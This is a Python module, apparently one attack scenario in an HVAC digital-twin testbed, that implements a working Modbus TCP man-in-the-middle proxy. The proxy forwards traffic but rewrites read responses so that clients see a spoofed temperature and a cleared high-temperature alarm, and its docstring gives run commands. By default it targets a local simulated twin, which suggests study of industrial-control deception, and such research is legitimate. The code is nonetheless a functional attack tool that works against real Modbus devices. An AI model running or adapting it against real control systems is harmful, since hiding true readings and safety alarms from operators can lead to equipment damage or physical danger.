"""Attack scenario #3: MITM proxy that rewrites Modbus TCP responses in
flight.

setpoint_spoof.py and alarm_mask.py work by writing into address space
the ladder or an operator is expected to write. A real sensor reading
(an input register) and a real status coil can't be overwritten that way
at all -- Modbus has no write function code for a read-only area, and
DigiTwin's own ModbusSlaveServer treats a published register as
read-only in practice regardless (see
examples/server_closet_controlled.toml's [modbus.slave_server] comment).
A MITM proxy doesn't write anything: it sits between a legitimate client
and the real twin, forwards everything unmodified, except it rewrites the
bytes of specific *responses* before they reach the client -- a genuine
protocol-level attack a plain accept-write can't do, and the literal form
of "deception": ground truth and what's displayed diverge because the
wire itself is lying, not because any tag's real value changed.

Point a client at this proxy's port instead of the twin's real port; the
proxy forwards everything (including writes -- an HMI's own commissioning
write reaches the real twin unchanged) except the specific reads a rule
targets.

    # 1. start the real twin
    uv run python -m hvac_twin.live_runner examples/server_closet_controlled.toml
    # 2. start the proxy in front of it
    uv run python -m hvac_twin.attacks.mitm_proxy --spoof-temp 75.0 --hide-alarm
    # 3. point any Modbus client (an HMI, or setpoint_spoof.py/alarm_mask.py)
    #    at the proxy's port (5021 by default) instead of the twin's (5020)
"""

from __future__ import annotations

import argparse
import socket
import struct
import threading
import time
from dataclasses import dataclass, field

_MBAP_LEN = 7
FUNC_READ_COILS = 1
FUNC_READ_INPUT_REGISTERS = 4
_READ_FUNCTIONS = (FUNC_READ_COILS, FUNC_READ_INPUT_REGISTERS)


@dataclass(frozen=True)
class SpoofRule:
    """Whenever a read response for `function_code` covers `address`,
    rewrite just that one register/coil to `value` before forwarding."""

    function_code: int
    address: int
    value: int


@dataclass(frozen=True)
class _PendingRequest:
    function_code: int
    start_address: int
    quantity: int


def _recv_exact(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _tamper_response(pdu: bytes, pending: _PendingRequest, rules: list[SpoofRule]) -> bytes:
    """Rewrite whichever registers/coils in `pdu` match a rule covering an
    address `pending` actually asked for; everything else in a
    multi-register/coil read is left untouched."""
    if pdu[0] != pending.function_code:
        return pdu  # an exception response, or something we don't expect -- leave it alone

    byte_count = pdu[1]
    payload = bytearray(pdu[2 : 2 + byte_count])
    for rule in rules:
        if rule.function_code != pending.function_code:
            continue
        offset = rule.address - pending.start_address
        if not (0 <= offset < pending.quantity):
            continue
        if pending.function_code == FUNC_READ_INPUT_REGISTERS:
            word_offset = offset * 2
            payload[word_offset : word_offset + 2] = struct.pack(">H", rule.value & 0xFFFF)
        elif pending.function_code == FUNC_READ_COILS:
            byte_index, bit_index = divmod(offset, 8)
            if rule.value:
                payload[byte_index] |= 1 << bit_index
            else:
                payload[byte_index] &= ~(1 << bit_index)

    return pdu[:2] + bytes(payload) + pdu[2 + byte_count :]


def _relay_client_to_target(
    client_sock: socket.socket,
    target_sock: socket.socket,
    pending: dict[int, _PendingRequest],
    lock: threading.Lock,
) -> None:
    """Forward every request unmodified, remembering read requests (by
    transaction id) so the reply side knows how to interpret the matching
    response."""
    try:
        while True:
            header = _recv_exact(client_sock, _MBAP_LEN)
            if header is None:
                break
            transaction_id, _protocol_id, length, _unit_id = struct.unpack(">HHHB", header)
            if length < 2:
                break  # malformed MBAP: not even a function code follows
            pdu = _recv_exact(client_sock, length - 1)
            if pdu is None:
                break
            if pdu[0] in _READ_FUNCTIONS and len(pdu) >= 5:
                start_address, quantity = struct.unpack(">HH", pdu[1:5])
                with lock:
                    pending[transaction_id] = _PendingRequest(pdu[0], start_address, quantity)
            try:
                target_sock.sendall(header + pdu)
            except OSError:
                break
    finally:
        try:
            target_sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass


def _relay_target_to_client(
    target_sock: socket.socket,
    client_sock: socket.socket,
    pending: dict[int, _PendingRequest],
    lock: threading.Lock,
    rules: list[SpoofRule],
) -> None:
    try:
        while True:
            header = _recv_exact(target_sock, _MBAP_LEN)
            if header is None:
                break
            transaction_id, _protocol_id, length, _unit_id = struct.unpack(">HHHB", header)
            if length < 2:
                break
            pdu = _recv_exact(target_sock, length - 1)
            if pdu is None:
                break
            with lock:
                req = pending.pop(transaction_id, None)
            if req is not None:
                pdu = _tamper_response(pdu, req, rules)
            try:
                client_sock.sendall(header + pdu)
            except OSError:
                break
    finally:
        try:
            client_sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass


def _handle_connection(
    client_sock: socket.socket, target_host: str, target_port: int, rules: list[SpoofRule]
) -> None:
    try:
        target_sock = socket.create_connection((target_host, target_port))
    except OSError:
        client_sock.close()
        return
    pending: dict[int, _PendingRequest] = {}
    lock = threading.Lock()
    to_target = threading.Thread(
        target=_relay_client_to_target, args=(client_sock, target_sock, pending, lock), daemon=True
    )
    to_client = threading.Thread(
        target=_relay_target_to_client,
        args=(target_sock, client_sock, pending, lock, rules),
        daemon=True,
    )
    to_target.start()
    to_client.start()
    to_target.join()
    to_client.join()
    client_sock.close()
    target_sock.close()


@dataclass
class MitmProxy:
    """A Modbus TCP proxy: forwards every request/response between a
    client and `target_host`:`target_port` unmodified, except it rewrites
    the specific reads `rules` cover. `start()`/`stop()` mirror
    ModbusSlaveServer's own naming -- same idempotent-thread-lifecycle
    shape, different direction (this is the twin as a Modbus *client*
    fronted by a spoofing relay, not the twin's own slave server)."""

    listen_host: str
    listen_port: int
    target_host: str
    target_port: int
    rules: list[SpoofRule] = field(default_factory=list)
    _server: socket.socket | None = field(default=None, repr=False, init=False)
    _thread: threading.Thread | None = field(default=None, repr=False, init=False)
    _stop: threading.Event = field(default_factory=threading.Event, repr=False, init=False)

    def start(self) -> None:
        if self._thread is not None:
            return
        self._stop.clear()
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.listen_host, self.listen_port))
        server.listen()
        server.settimeout(0.2)  # so the accept loop can notice stop() on any platform
        self.listen_port = server.getsockname()[1]
        self._server = server
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self) -> None:
        assert self._server is not None
        while not self._stop.is_set():
            try:
                client_sock, _addr = self._server.accept()
            except TimeoutError:
                continue
            except OSError:
                break
            threading.Thread(
                target=_handle_connection,
                args=(client_sock, self.target_host, self.target_port, self.rules),
                daemon=True,
            ).start()

    def stop(self) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=2.0)
        if self._server is not None:
            self._server.close()
        self._thread = None
        self._server = None


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--listen-host", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, default=5021)
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, default=5020)
    parser.add_argument(
        "--spoof-temp",
        type=float,
        default=None,
        help="fake closet temperature (F) shown to anything reading through this proxy",
    )
    parser.add_argument(
        "--hide-alarm",
        action="store_true",
        help="always show high_temp_alarm as clear to anything reading through this proxy",
    )
    args = parser.parse_args(argv)

    rules: list[SpoofRule] = []
    if args.spoof_temp is not None:
        spoof_tenths = round(args.spoof_temp * 10)
        rules.append(SpoofRule(FUNC_READ_INPUT_REGISTERS, address=0, value=spoof_tenths))
    if args.hide_alarm:
        rules.append(SpoofRule(FUNC_READ_COILS, address=0, value=0))
    if not rules:
        raise SystemExit("nothing to spoof: pass --spoof-temp and/or --hide-alarm")

    proxy = MitmProxy(args.listen_host, args.listen_port, args.target_host, args.target_port, rules)
    proxy.start()
    print(
        f"MITM proxy: {args.listen_host}:{proxy.listen_port} "
        f"-> {args.target_host}:{args.target_port}"
    )
    for rule in rules:
        kind = "coil" if rule.function_code == FUNC_READ_COILS else "input register"
        print(f"  spoofing {kind} @ address {rule.address} -> {rule.value}")
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        proxy.stop()


if __name__ == "__main__":
    main()
